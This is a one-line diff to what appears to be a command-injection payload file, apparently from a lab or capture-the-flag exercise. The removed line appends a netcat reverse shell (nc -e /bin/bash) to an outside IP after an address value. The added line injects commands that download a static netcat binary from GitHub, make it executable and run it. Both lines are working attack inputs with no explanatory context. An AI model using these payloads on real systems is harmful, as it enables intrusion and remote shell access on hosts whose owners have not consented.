@@ -1,1 +1,1 @@
-127.0.0.1 || nc -e /bin/bash 10.42.153.134 1337
+;wget https://github.com/yunchih/static-binaries/raw/master/nc;chmod +x nc;./nc -V
